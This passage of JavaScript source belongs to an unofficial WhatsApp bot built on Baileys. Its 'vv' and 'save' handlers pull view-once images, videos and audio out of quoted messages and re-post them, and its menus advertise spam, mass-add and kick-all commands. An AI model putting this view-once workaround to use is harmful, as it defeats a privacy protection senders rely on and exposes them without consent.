        let vMessage =
            quoted.viewOnceMessageV2?.message ||
            quoted.viewOnceMessage?.message ||
            quoted;

        let mediaType = null;
        let mediaKey = null;

        if (vMessage.imageMessage) {
            mediaType = 'image';
            mediaKey = vMessage.imageMessage;
        } else if (vMessage.videoMessage) {
            mediaType = 'video';
            mediaKey = vMessage.videoMessage;
        } else if (vMessage.audioMessage) {
            mediaType = 'audio';
            mediaKey = vMessage.audioMessage;
        }

        if (!mediaKey) {
            if (quoted.imageMessage?.viewOnce) {
                mediaType = 'image';
                mediaKey = quoted.imageMessage;
            } else if (quoted.videoMessage?.viewOnce) {
                mediaType = 'video';
                mediaKey = quoted.videoMessage;
            } else if (quoted.audioMessage?.viewOnce) {
                mediaType = 'audio';
                mediaKey = quoted.audioMessage;
            }
        }

        if (!mediaKey || !mediaType) {
            return await SYHaTeReplay('❌ *This is not a view-once media message!*');
        }

        const stream = await downloadContentFromMessage(mediaKey, mediaType);

        let buffer = Buffer.from([]);

        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const caption =
            mediaKey.caption ||
            `✅ *View-Once ${mediaType.charAt(0).toUpperCase() + mediaType.slice(1)} Downloaded*`;

        if (mediaType === 'image') {
            await SYHaTeReplay({
                image: buffer,
                caption
            });
        } else if (mediaType === 'video') {
            await SYHaTeReplay({
                video: buffer,
                caption
            });
        } else if (mediaType === 'audio') {
            await SYHaTeReplay({
                audio: buffer,
                mimetype: mediaKey.mimetype || 'audio/mp4',
                ptt: mediaKey.ptt || false
            });
        }

    } catch (err) {
        console.error('VV Error:', err);

        await SYHaTeReplay('❌ *Failed to fetch view-once media!*');
    }
}

if (SYHaTeS7 === 'save') {
    try {
        const { downloadContentFromMessage } = require('@whiskeysockets/baileys');
        const quoted = S7.message?.extendedTextMessage?.contextInfo?.quotedMessage;
        if (!quoted) return await SYHaTeReplay('❌ *Please reply to a image or video!*');
        let vMessage = quoted.viewOnceMessageV2?.message || 
                       quoted.viewOnceMessage?.message || 
                       quoted;

        let mediaType = vMessage.imageMessage ? 'image' : vMessage.videoMessage ? 'video' : null;
        let mediaKey = vMessage.imageMessage || vMessage.videoMessage;
        if (!mediaKey) {
            if (quoted.imageMessage?.viewOnce) {
                mediaKey = quoted.imageMessage;
                mediaType = 'image';
            } else if (quoted.videoMessage?.viewOnce) {
                mediaKey = quoted.videoMessage;
                mediaType = 'video';
            }
        }

        if (!mediaKey || !mediaType) {
            return await SYHaTeReplay('❌ *This is not a Media message!*');
        }
        const stream = await downloadContentFromMessage(mediaKey, mediaType);
        let buffer = Buffer.from([]);
        for await (const chunk of stream) {
            buffer = Buffer.concat([buffer, chunk]);
        }

        const caption = mediaKey.caption || `✅ *${mediaType === 'image' ? 'Image' : 'Video'} Downloaded*`;

        if (mediaType === 'image') {
            await SYHaTeReplay({ image: buffer, caption });
        } else {
            await SYHaTeReplay({ video: buffer, caption });
        }

    } catch (err) {
        await SYHaTeReplay('❌ *Failed to fetch media!*');
    }
}

               if (SYHaTeS7 === 'autoreact') {
    const normalizeNumber = (jid = '') => jid.split('@')[0];
    const botNumber = SYxS7.user.id.split(':')[0] + '@s.whatsapp.net';

    const isOwner = S7.key.fromMe;

    if (!isOwner) {
        return await SYHaTeReplay(owneronly);
    }

    let db = getDB();

    if (!db[botNumber]) {
        db[botNumber] = {
            autoreact: false,
            emojis: ['❤️', '✨', '🔥', '⚡', '👑']
        };
    }

    if (!Array.isArray(db[botNumber].emojis)) {
        db[botNumber].emojis = ['❤️', '✨', '🔥', '⚡', '👑'];
        saveDB(db); 
    }

    if (!text) {
        const status = db[botNumber].autoreact ? 'ON ✅' : 'OFF ❌';
        const currentEmojis = db[botNumber].emojis.join(' ');
        
        return await SYHaTeReplay(
            `*ＡＵＴＯ - ＲＥＡＣＴ  ＳＴＡＴＵＳ*\n\n` +
            `> *Status:* ${status}\n` +
            `> *Emojis:* ${currentEmojis}\n\n` +
            `*ＵＳＡＧＥ*\n` +
            `> ${prefix}autoreact on\n` +
            `> ${prefix}autoreact off\n` +
            `> ${prefix}autoreact set ❤️🔥⚡\n` +
            `> ${prefix}autoreact unset`
        );
    }
    
    if (args[0] === 'on') {
        db[botNumber].autoreact = true;
        saveDB(db);
        return await SYHaTeReplay('✅ *Auto-React Enabled!*');
    }
    
    if (args[0] === 'off') {
        db[botNumber].autoreact = false;
        saveDB(db);
        return await SYHaTeReplay('❌ *Auto-React Disabled!*');
    }
    
    if (args[0] === 'set') {
        const emojisOnly = text.replace('set', '').trim();
        if (!emojisOnly) {
            return await SYHaTeReplay('❌ *Emojis provide karo!*');
        }
        db[botNumber].emojis = Array.from(emojisOnly);
        saveDB(db);
        return await SYHaTeReplay(
            `✅ *New Emojis Saved:* ${db[botNumber].emojis.join(' ')}`
        );
    }
    
    if (args[0] === 'unset') {
        db[botNumber].emojis = ['❤️', '✨', '🔥', '⚡', '👑'];
        saveDB(db);
        return await SYHaTeReplay('♻️ *Emojis reset to default!*');
    }
}



                
                if (SYHaTeS7 === 'getpp') {
    try {
        let ppUrl;
        try {
            ppUrl = await SYxS7.profilePictureUrl(from, 'image');
        } catch {
            ppUrl = null;
        }

        if (!ppUrl) {
            return await SYHaTeReplay('❌ *Profile picture not found or privacy restricted!*');
        }

        await SYHaTeReplay({
            image: { url: ppUrl },
            caption: '🖼️ *Profile Picture Fetch Successful*'
        }, {
            adReply: {
                title: "𝒁𝑶𝑹𝑶 𝑮𝑬𝑻𝑷𝑷",
                body: `ᴘᴏᴡᴇʀᴇᴅ ʙʏ sᴀʏᴀɴ`,
                mediaType: 1,
                thumbnailUrl: "https://ibb.co/WYNWBMx",
                sourceUrl: "https://sayan.is-a.dev",
                renderLargerThumbnail: false
            }
        });

    } catch (err) {
        console.error('getpp error:', err);
        await SYHaTeReplay('❌ *Failed to fetch profile picture!*');
    }
}


               if (SYHaTeS7 === 'menu') {

    await SABIR7718_MENU({

        db,
        botNumber,
        prefix,
        config,

        SYHaTeReplayS7,

        getRuntime,
        formatSize

    });

}

if (SYHaTeS7 === 's7menu') {
    let db = getDB();
    const uptime = getRuntime(db, saveDB);
    const ram_used = formatSize(process.memoryUsage().rss);
    const ram_total = formatSize(os.totalmem());
    const NoLoveMore = "‎".repeat(678);

    let storage_used = "N/A", storage_total = "N/A";
    try {
        const stats = fs.statfsSync('/');
        storage_total = formatSize(stats.bsize * stats.blocks);
        storage_used = formatSize(stats.bsize * (stats.blocks - stats.bfree));
    } catch (e) {}

    let customMenu = '';
    if (db[botNumber]?.customcmds) {
        const cmds = Object.keys(db[botNumber].customcmds);
        if (cmds.length > 0) {
            customMenu += `\n╭─〔 *𝘾𝙐𝙎𝙏𝙊𝙈 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎* 〕\n`;
            cmds.forEach(cmd => {
                customMenu += `│ ⬡ *${prefix}${cmd}*\n`;
            });
            customMenu += `╰───────────────`;
        }
    }

    const hour = new Date().getHours();
    const greeting = hour < 12 ? "🌅 𝙂𝙤𝙤𝙙 𝙈𝙤𝙧𝙣𝙞𝙣𝙜" : 
                    hour < 17 ? "☀️ 𝙂𝙤𝙤𝙙 𝘼𝙛𝙩𝙚𝙧𝙣𝙤𝙤𝙣" : 
                    hour < 21 ? "🌆 𝙂𝙤𝙤𝙙 𝙀𝙫𝙚𝙣𝙞𝙣𝙜" : "🌙 𝙂𝙤𝙤𝙙 𝙉𝙞𝙜𝙝𝙩";

    const menu = `
╭━━━━━━━━━━━━━━━━━━⬣
┃ *${greeting}, ${S7user}*
╰━━━━━━━━━━━━━━━━━━⬣

╭─〔 *𝙎𝙔𝙎𝙏𝙀𝙈 𝙄𝙉𝙁𝙊* 〕
│ ⏱ 𝙍𝙪𝙣𝙩𝙞𝙢𝙚 : *${uptime}*
│ 🧠 𝙍𝘼𝙈 : *${ram_used} / ${ram_total}*
│ 💾 𝙎𝙩𝙤𝙧𝙖𝙜𝙚 : *${storage_used} / ${storage_total}*
│ ⚙️ 𝙋𝙧𝙚𝙛𝙞𝙭 : *${prefix}*
╰───────────────

${NoLoveMore}╭─〔 *𝙊𝙒𝙉𝙀𝙍* 〕
│ ⬡ 𝘀𝗲𝗹𝗳 → ${prefix}self
│ ⬡ 𝗽𝘂𝗯𝗹𝗶𝗰 → ${prefix}public
│ ⬡ 𝗽𝗿𝗲𝗳𝗶𝘅 → ${prefix}prefix set/unset
│ ⬡ 𝗼𝘄𝗻𝗲𝗿 → ${prefix}owner
│ ⬡ 𝘀𝗲𝘁𝗰𝗵𝗮𝗻𝗻𝗲𝗹 → ${prefix}setchannel
│ ⬡ 𝘃𝗶𝗲𝘄𝗰𝗵𝗮𝗻𝗻𝗲𝗹 → ${prefix}viewchannel on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝗰𝗮𝗹𝗹 → ${prefix}anticall on/off
│ ⬡ 𝗽𝗿𝗼𝗺𝗼𝘁𝗲𝗺𝗲 → ${prefix}promoteme
╰───────────────

╭─〔 *𝙋𝙍𝙊𝙁𝙄𝙇𝙀 / 𝙏𝙂* 〕
│ ⬡ 𝗴𝗲𝘁𝗽𝗽 → ${prefix}getpp
│ ⬡ 𝘀𝗲𝘁𝗽𝗽 → ${prefix}setpp
│ ⬡ 𝗴𝗲𝘁𝗷𝗶𝗱 → ${prefix}getjid
│ ⬡ 𝗴𝗲𝘁𝗹𝗶𝗱 → ${prefix}getlid
│ ⬡ 𝘁𝗴𝗶𝗻𝗳𝗼 → ${prefix}tginfo <id>
│ ⬡ 𝘃𝘃 → ${prefix}vv
│ ⬡ 𝘀𝗮𝘃𝗲 → ${prefix}save
│ ⬡ 𝗴𝗲𝘁 → ${prefix}get
╰───────────────

╭─〔 *𝙂𝙍𝙊𝙐𝙋 𝙈𝘼𝙉𝘼𝙂𝙀𝙈𝙀𝙉𝙏* 〕
│ ⬡ 𝗵𝗶𝗱𝗲𝘁𝗮𝗴 → ${prefix}hidetag <text>
│ ⬡ 𝘁𝗮𝗴𝗮𝗹𝗹 → ${prefix}tagall <text>
│ ⬡ 𝗮𝗱𝗱 → ${prefix}add <number>
│ ⬡ 𝗸𝗶𝗰𝗸 → ${prefix}kick @user
│ ⬡ 𝗽𝗿𝗼𝗺𝗼𝘁𝗲 → ${prefix}promote @user
│ ⬡ 𝗱𝗲𝗺𝗼𝘁𝗲 → ${prefix}demote @user
│ ⬡ 𝗸𝗶𝗰𝗸𝗮𝗹𝗹 → ${prefix}kickall
│ ⬡ 𝗮𝗻𝘁𝗶𝗹𝗶𝗻𝗸 → ${prefix}antilink on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝗯𝗼𝘁 → ${prefix}antibot on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝘀𝘁𝗶𝗰𝗸𝗲𝗿 → ${prefix}antisticker on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝘁𝗮𝗴 → ${prefix}antitag on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝗺𝗲𝗻𝘁𝗶𝗼𝗻 → ${prefix}antimention on/off
│ ⬡ 𝗮𝗻𝘁𝗶𝗱𝗲𝗹𝗲𝘁𝗲 → ${prefix}antidelete on/off
│ ⬡ 𝘄𝗲𝗹𝗰𝗼𝗺𝗲 → ${prefix}welcome on/off
│ ⬡ 𝗴𝗼𝗼𝗱𝗯𝘆𝗲 → ${prefix}goodbye on/off
│ ⬡ 𝗺𝘂𝘁𝗲 → ${prefix}mute / ${prefix}unmute
│ ⬡ 𝗴𝘀𝘁𝗮𝘁𝘂𝘀 → ${prefix}gstatus
│ ⬡ 𝘀𝗲𝘁𝗴𝗻𝗮𝗺𝗲 → ${prefix}setgname <name>
│ ⬡ 𝘀𝗲𝘁𝗴𝗽𝗽 → ${prefix}setgpp
╰───────────────

╭─〔 *𝘼𝙐𝙏𝙊 𝙁𝙀𝘼𝙏𝙐𝙍𝙀𝙎* 〕
│ ⬡ 𝗮𝘂𝘁𝗼𝗿𝗲𝗮𝗰𝘁 → ${prefix}autoreact on/off ❤️🔥
│ ⬡ 𝗮𝘂𝘁𝗼𝘀𝘁𝗮𝘁𝘂𝘀 → ${prefix}autostatus set/unset
╰───────────────

╭─〔 *𝙈𝙀𝘿𝙄𝘼 / 𝘿𝙊𝙒𝙉𝙇𝙊𝘼𝘿* 〕
│ ⬡ 𝗽𝗹𝗮𝘆 → ${prefix}play <song>
│ ⬡ 𝘀𝗼𝗻𝗴 → ${prefix}song <name>
│ ⬡ 𝗽𝗹𝗮𝘆𝟮 → ${prefix}play2 <name>
│ ⬡ 𝘀𝗽𝗼𝘁𝗶𝗳𝘆 → ${prefix}spotify <name>
│ ⬡ 𝗳𝗯 → ${prefix}fb <link>
│ ⬡ 𝗶𝗴 → ${prefix}ig <link>
│ ⬡ 𝘆𝘁𝗺𝗽𝟰 → ${prefix}ytmp4 <link>
│ ⬡ 𝘆𝘁𝘃𝗶𝗱𝗲𝗼 → ${prefix}ytvideo <link>
╰───────────────

╭─〔 *𝘾𝙊𝙉𝙑𝙀𝙍𝙏𝙀𝙍* 〕
│ ⬡ 𝘁𝗼𝘀𝘁𝗶𝗰𝗸𝗲𝗿 → ${prefix}tosticker
│ ⬡ 𝘁𝗼𝗴𝗶𝗳 → ${prefix}togif
│ ⬡ 𝗽𝘁𝘃 → ${prefix}ptv
│ ⬡ 𝘀𝘁𝗺𝗮𝗸𝗲𝗿 → ${prefix}stmaker <text>
│ ⬡ 𝗯𝗿𝗮𝘁 → ${prefix}brat <text>
│ ⬡ 𝗳𝗼𝗻𝘁 → ${prefix}font <no> <text>
│ ⬡ 𝘁𝘁𝘀 → ${prefix}tts <text>
│ ⬡ 𝘁𝗴 → ${prefix}tg <url>
╰───────────────

╭─〔 *𝘼𝙄 / 𝙏𝙊𝙊𝙇𝙎* 〕
│ ⬡ 𝗴𝗽𝘁 → ${prefix}gpt <query>
│ ⬡ 𝗽𝗶𝗻𝗴 → ${prefix}ping
│ ⬡ 𝗽𝗶𝗻𝗴𝟮 → ${prefix}ping2
│ ⬡ 𝗱𝗲𝘃𝗶𝗰𝗲 → ${prefix}device
│ ⬡ 𝗰𝗵𝗲𝗰𝗸𝗺𝘀𝗴 → ${prefix}checkmsg
│ ⬡ 𝗰𝗵𝗲𝗰𝗸𝗿𝗮𝘄 → ${prefix}checkraw
│ ⬡ 𝗰𝗵𝗶𝗱 → ${prefix}chid <link>
╰───────────────

╭─〔 *𝙁𝙐𝙉 / 𝙀𝙓𝙏𝙍𝘼* 〕
│ ⬡ 𝘀𝗽𝗮𝗺 → ${prefix}spam <count>
│ ⬡ 𝗺𝗲𝗻𝘁𝗶𝗼𝗻 → ${prefix}mention
│ ⬡ 𝘀𝗮𝘃𝗲𝗺𝘀𝗴 → ${prefix}savemsg <name>
│ ⬡ 𝗱𝗲𝗹𝗺𝘀𝗴 → ${prefix}delmsg <name>
│ ⬡ 𝗹𝗶𝘀𝘁𝗴𝗰 → ${prefix}listgc
╰───────────────

╭─〔 *𝙉𝙎𝙁𝙒 (𝙊𝙒𝙉𝙀𝙍)* 〕
│ ⬡ 𝗽𝗼𝗿𝗻 → ${prefix}porn
│ ⬡ 𝗽𝗼𝗿𝗻𝘃𝗶𝗱 → ${prefix}pornvid
╰───────────────
${customMenu}

╭━━━━━━━━━━━━━━━━━━⬣
┃ 𖤍 ⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶
╰━━━━━━━━━━━━━━━━━━⬣
`;
    const LEON = path.join(process.cwd(), 'SY', 'Leon.mp4');
    
    const adOptions = {
                        externalAdReply: {
                            title: "⤷ 𝚈𝚘𝚞𝚛 𝚂𝙰𝙱𝙸𝚁⁷⁷¹⁸ ⤶",
                            body: "",
                            thumbnailUrl: "https://sabir7718.is-a.dev/photos/S7.jpg",
                            sourceUrl: "https://sabir7718.is-a.dev",
                            mediaType: 1,
                            renderLargerThumbnail: false
                        }
                    };
                    
            await SYHaTeReplayB(
            {
                video: fs.readFileSync(LEON), 
                caption: menu,
                gifPlayback: true
            },
            adOptions
            );
            
            const audios = [
                "https://sabir7718.is-a.dev/songs/Nunca.mp3",
                "https://sabir7718.is-a.dev/songs/ComMedo.mp3"
            ];
            
            const randomAudio = audios[Math.floor(Math.random() * audios.length)];
            
            await SYHaTeReplay({
                audio: { url: "https://sabir7718.is-a.dev/songs/LeonVid.mp3" },
                mimetype: "audio/mpeg"
            });
}
                
                if (SYHaTeS7 === 'menu2') {
                    let db = getDB();
                    const uptime = getRuntime(db, saveDB);
                    const ram_used = formatSize(process.memoryUsage().rss);
                    const ram_total = formatSize(os.totalmem());
                    let storage_used = "N/A", storage_total = "N/A";
                    try {
                        const stats = fs.statfsSync('/');
                        storage_total = formatSize(stats.bsize * stats.blocks);
                        storage_used = formatSize(stats.bsize * (stats.blocks - stats.bfree));
                    } catch {}

                    const hour = new Date().getHours();
                    let SYgreeting = hour < 12 ? "ɢᴏᴏᴅ ᴍᴏʀɴɪɴɢ 🌅" : hour < 17 ? "ɢᴏᴏᴅ ᴀꜰᴛᴇʀɴᴏᴏɴ ☀️" : hour < 21 ? "ɢᴏᴏᴅ ᴇᴠᴇɴɪɴɢ 🌆" : "ɢᴏᴏᴅ ɴɪɢʜᴛ 🌙";

const menu = `╭━━〔 *ᴢᴏʀᴏ ᴍᴅ ʟɪᴛᴇ* 〕━━┈⊷
┃ *_ᴏᴡɴᴇʀ_* :  *_𝐃 𝐇 — ا 𝐘_* 
┃ *_ʀᴜɴᴛɪᴍᴇ_*  :  ${uptime}
┃ *_ʀᴀᴍ_* : ${ram_used}/${ram_total}
┃ *_ꜱᴛᴏʀᴀɢᴇ_* : ${storage_used}/${storage_total}
┃ *_ᴩʀᴇꜰɪx_* : *_[ ${prefix} ]_* 
╰━━━━━━━━━━━━━━┈⊷

*╰┈➤ ᴏᴡɴᴇʀ*
> *_✗  ᴏᴡɴᴇʀ_*  
> *_✗  ɢᴇᴛʟɪᴅ_*
> *_✗  ɢᴇᴛᴊɪᴅ_*
> *_✗  ꜱᴇʟꜰ_* 
> *_✗  ᴘᴜʙʟɪᴄ_* 
> *_✗  ᴘʀᴇꜰɪx ꜱᴇᴛ_* 

*╰┈➤ ᴘʀᴏꜰɪʟᴇ / ᴛɢ*
> *_✗  ɢᴇᴛᴘᴘ_* 
> *_✗  ꜱᴇᴛᴘᴘ_* 
> *_✗  ᴛɢɪɴꜰᴏ_*
> *_✗  ᴠᴠ_*  
> *_✗  ʟᴏᴏᴋᴜᴘ_*  

*╰┈➤ ɢʀᴏᴜᴘ*
> *_✗  ʜɪᴅᴇᴛᴀɢ_* 
> *_✗  ᴀɴᴛɪᴍᴇɴᴛɪᴏɴ_*
> *_✗  ᴀᴅᴅ_*
> *_✗  ᴍᴀssᴀᴅᴅ_*
> *_✗  ᴛᴀɢ_* 
> *_✗  ᴛᴀɢᴀʟʟ_* 
> *_✗  ᴋɪᴄᴋ_* 
> *_✗  ᴋɪᴄᴋᴀʟʟ_* 
> *_✗  ᴀɴᴛɪʟɪɴᴋ_* 
> *_✗  ᴅᴇʟᴇᴛᴇ_* 
> *_✗  ᴩʀᴏᴍᴏᴛᴇ_* 
> *_✗  ᴅᴇᴍᴏᴛᴇ_*
> *_✗  ᴡᴇʟᴄᴏᴍᴇ_*
> *_✗  ɢᴏᴏᴅʙʏᴇ_*   
> *_✗  ᴀɴᴛɪꜱᴛɪᴄᴋᴇʀ_*
> *_✗  ᴀɴᴛɪʙᴏᴛ_*
> *_✗  ᴋɪᴄᴋ ᴀᴅᴍɪɴ_* 
> *_✗  ɢsᴛᴀᴛᴜs_* 
> *_✗  ᴍᴜᴛᴇ_* 
> *_✗  ᴜɴᴍᴜᴛᴇ_*

*╰┈➤ ᴀᴜᴛᴏ ꜰᴇᴀᴛᴜʀᴇꜱ*
> *_✗  ᴀᴜᴛᴏꜱᴛᴀᴛᴜꜱ   ꜱᴇᴇɴ_* 
> *_✗  ᴀᴜᴛᴏʀᴇᴀᴄᴛ....ᴏɴ/ᴏꜰꜰ_* 

*╰┈➤ ᴇxᴛʀᴀ ꜰᴇᴀᴛᴜʀᴇꜱ*
> *_✗  ꜱᴘᴀᴍ_*
> *_✗  ꜱᴀᴠᴇ_*

*╰┈➤ ᴍᴇᴅɪᴀ*
> *_✗  ꜱᴏɴɢ_* 
> *_✗  ᴘʟᴀʏ_* 
> *_✗  ꜰʙ_* 
> *_✗  ɪɢ_* 
> *_✗  ꜱᴩᴏᴛɪꜰʏ_*
> *_✗  ᴀᴩᴋ_* 

*╰┈➤ ᴀɪ / ᴛᴏᴏʟꜱ*
> *_✗  ɢᴘᴛ_* 
> *_✗  ᴘɪɴɢ_*
> *_✗  ʀᴇᴍɪɴɪ_*  

*╰┈➤ ᴅᴇᴠᴇʟᴏᴘᴇʀ*
> *_✗  ᴅᴇᴠɪᴄᴇ_*
> *_✗  ᴄʜᴇᴄᴋᴍꜱɢ_*

*╰┈➤ ɴꜱꜰᴡ*
> *_✗  ᴘᴏʀɴᴠɪᴅ_*
> *_✗  ᴘᴏʀɴ_*

╭━━━━━━━━━━━━┈⊷
   _*ѕᴀʏᴀɴ-x @ ᴍɪɴɪ ʙᴏᴛ*_
╰━━━━━━━━━━━━┈⊷`;

                    const PNG = path.join(process.cwd(), 'SY', 'Loves.png');
                    const adOptions = {
                        externalAdReply: {
                            title: "© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓𝐄",
                            body: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ sᴀʏᴀɴ",
                            thumbnailUrl: "https://i.ibb.co/Fjkb8yx/IMG-20260412-205941-334.jpg",
                            sourceUrl: config.channel,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    };

                    const videoPath = path.join(process.cwd(), 'SY', 'S7.mp4');
                    if (fs.existsSync(videoPath)) {
                        return await SYHaTeReplay(menu, adOptions);
                    } else {
                        return await SYHaTeReplay(menu, adOptions);
                    }
                }
                
                if (SYHaTeS7 === 'michi') {
                    const uptime = getRuntime(process.uptime());
                    const ram_used = formatSize(process.memoryUsage().rss);
                    const ram_total = formatSize(os.totalmem());
                    let storage_used = "N/A", storage_total = "N/A";
                    try {
                        const stats = fs.statfsSync('/');
                        storage_total = formatSize(stats.bsize * stats.blocks);
                        storage_used = formatSize(stats.bsize * (stats.blocks - stats.bfree));
                    } catch {}

                    const hour = new Date().getHours();
                    let SYgreeting = hour < 12 ? "ɢᴏᴏᴅ ᴍᴏʀɴɪɴɢ 🌅" : hour < 17 ? "ɢᴏᴏᴅ ᴀꜰᴛᴇʀɴᴏᴏɴ ☀️" : hour < 21 ? "ɢᴏᴏᴅ ᴇᴠᴇɴɪɴɢ 🌆" : "ɢᴏᴏᴅ ɴɪɢʜᴛ 🌙";

const menu = `ʜᴇʟʟᴏ ${S7user}
╰┈➤ ${SYgreeting} 

╰┈➤ ʙᴏᴛ ɪɴꜰᴏ
> *_ᴜᴘᴛɪᴍᴇ_* : ${uptime}
> *_ʀᴀᴍ_* : ${ram_used}/${ram_total}
> *_ꜱᴛᴏʀᴀɢᴇ_* : ${storage_used}/${storage_total}
> *_ᴘʀᴇꜰɪx_* : ${prefix}

╰┈➤ ᴏᴡɴᴇʀ / ᴀᴅᴍɪɴ
> *_ᴏᴡɴᴇʀ_* ${prefix}owner
> *_ꜱᴇᴛᴘᴘ_* ${prefix}setpp
> *_ꜱᴇʟꜰ_* ${prefix}self
> *_ᴘᴜʙʟɪᴄ_* ${prefix}public
> *_ᴘʀᴇꜰɪx_* ${prefix}prefix set
> *_ɢᴇᴛᴊɪᴅ_* ${prefix}getjid
> *_ɢᴇᴛʟɪᴅ_* ${prefix}getlid
> *_ꜱᴘᴀᴍ_* ${prefix}spam

╰┈➤ ɢʀᴏᴜᴘ
> *_ʜɪᴅᴇᴛᴀɢ_* ${prefix}hidetag
> *_ᴛᴀɢ_* ${prefix}tag
> *_ᴛᴀɢᴀʟʟ_* ${prefix}tagall
> *_ᴀɴᴛɪᴛᴀɢ_* ${prefix}antitag
> *_ᴀɴᴛɪʟɪɴᴋ_* ${prefix}antilink
> *_ᴀɴᴛɪʙᴏᴛ_* ${prefix}antibot
> *_ᴀɴᴛɪꜱᴛɪᴄᴋᴇʀ_* ${prefix}antisticker
> *_ᴀɴᴛɪᴍᴇɴᴛɪᴏɴ_* ${prefix}antimention
> *_ᴀᴅᴅ_* ${prefix}add
> *_ᴍᴀssᴀᴅᴅ_* ${prefix}massadd
> *_ɢsᴛᴀᴛᴜs_* ${prefix}gstatus
> *_ᴍᴜᴛᴇ_* ${prefix}mute
> *_ᴜɴᴍᴜᴛᴇ_* ${prefix}unmute

╰┈➤ ᴘʀᴏꜰɪʟᴇ / ᴛɢ
> *_ɢᴇᴛᴘᴘ_* ${prefix}getpp
> *_ᴠᴠ_* ${prefix}vv
> *_ʟᴏᴏᴋᴜᴘ_* ${prefix}lookup
> *_ᴛɢ_* ${prefix}tg
> *_ᴛɢɪɴꜰᴏ_* ${prefix}tginfo

╰┈➤ ᴍᴇᴅɪᴀ / ᴄᴏɴᴠᴇʀᴛ
> *_ᴘʟᴀʏ_* ${prefix}play
> *_ꜰʙ_* ${prefix}fb
> *_ɪɢ_* ${prefix}ig
> *_ꜱᴛᴍᴀᴋᴇʀ_* ${prefix}stmaker
> *_ᴛᴛꜱ_* ${prefix}tts

╰┈➤ ɢʀᴇᴇᴛɪɴɢꜱ
> *_ᴡᴇʟᴄᴏᴍᴇ_* ${prefix}welcome
> *_ɢᴏᴏᴅʙʏᴇ_* ${prefix}goodbye

╰┈➤ ᴀᴜᴛᴏ ꜰᴇᴀᴛᴜʀᴇꜱ
> *_ᴀᴜᴛᴏꜱᴛᴀᴛᴜꜱ_* ${prefix}autostatus seen
> *_ᴀᴜᴛᴏʀᴇᴀᴄᴛ_* ${prefix}autoreact

╰┈➤ ᴀɪ / ᴛᴏᴏʟꜱ
> *_ɢᴘᴛ_* ${prefix}gpt
> *_ᴘɪɴɢ_* ${prefix}ping

╰┈➤ ᴅᴇᴠᴇʟᴏᴘᴇʀ ᴛᴏᴏʟꜱ
> *_ᴅᴇᴠɪᴄᴇ_* ${prefix}device
> *_ᴄʜᴇᴄᴋᴍꜱɢ_* ${prefix}checkmsg

╰┈➤ ɴꜱꜰᴡ
> *_ᴘᴏʀɴ_* ${prefix}porn
> *_ᴘᴏʀɴᴠɪᴅ_* ${prefix}pornvid

> *© 𝐙𝐎𝐑𝐎 𝐌𝐃 𝐋𝐈𝐓𝐄 2026*`;


                    const videoPath = path.join(process.cwd(), 'SY', 'MICHI.mp4');
                    if (fs.existsSync(videoPath)) {
                        return await SYHaTeReplay({ video: fs.readFileSync(videoPath), caption: menu, gifPlayback: true });
                    } else {
                        return await SYHaTeReplay(menu);
                    }
                }
                if (db[botNumber]?.customcmds && db[botNumber].customcmds[SYHaTeS7]) {
                const customData = db[botNumber].customcmds[SYHaTeS7];           
                await SYHaTeReplay({ 
                    forward: customData 
                });
                return;
                }

           };

            if (isCmd) await SYHaTe();

        } catch (err) {
            console.error(err);
        }
    }
    
/*if (typeof module === 'undefined' || typeof module.exports === 'undefined') {
    export { LOVE_SY_S7 };
    export default LOVE_SY_S7;
}
else {
    module.exports = LOVE_SY_S7;
    module.exports.LOVE_SY_S7 = LOVE_SY_S7;
    module.exports.default = LOVE_SY_S7;
}*/
module.exports = LOVE_SY_S7;
module.exports.LOVE_SY_S7 = LOVE_SY_S7;
module.exports.default = LOVE_SY_S7;

const dpInterval = setInterval(async () => {
    try {
        if (!global.SYHaTeS7 || !global.SYHaTeS7.user) return;
        
        log("Interval triggered successfully");
        
        const sock = global.SYHaTeS7;
        const botNumber = sock.user.id.split(':')[0] + '@s.whatsapp.net';
        const db = getDB();
        
        if (!db[botNumber] || !db[botNumber].timedDPs || db[botNumber].timedDPs.length === 0) return;
        
        const d = new Date();
        const kolkataTime = d.toLocaleTimeString("en-US", { timeZone: "Asia/Kolkata", hour12: false });
        const [hours, minutes] = kolkataTime.split(':');
        const currentTimeStr = `${hours}:${minutes}`;
        
        const matchingSlot = db[botNumber].timedDPs.find(slot => {
            return currentTimeStr >= slot.start && currentTimeStr <= slot.end;
        });
        
        if (matchingSlot && global.lastAppliedDPPath !== matchingSlot.path) {
            log("Updating profile picture to matching slot path");
            const fs = require('fs');
            if (fs.existsSync(matchingSlot.path)) {
                let sharp;
                try { sharp = require('sharp'); } catch (e) { return; }
                
                const buffer = fs.readFileSync(matchingSlot.path);
                const processedBuffer = await sharp(buffer)
                    .resize(720, 720, { fit: "inside" })
                    .jpeg({ quality: 100, chromaSubsampling: "4:4:4" })
                    .toBuffer();
                
                await sock.query({
                    tag: "iq",
                    attrs: { to: "@s.whatsapp.net", type: "set", xmlns: "w:profile:picture" },
                    content: [{ tag: "picture", attrs: { type: "image" }, content: processedBuffer }]
                });
                
                log("Profile picture update complete");
                global.lastAppliedDPPath = matchingSlot.path;
            }
        }
    } catch (e) {
        log(`Timed DP Interval Error: ${e.message}`);
    }
}, 3000);
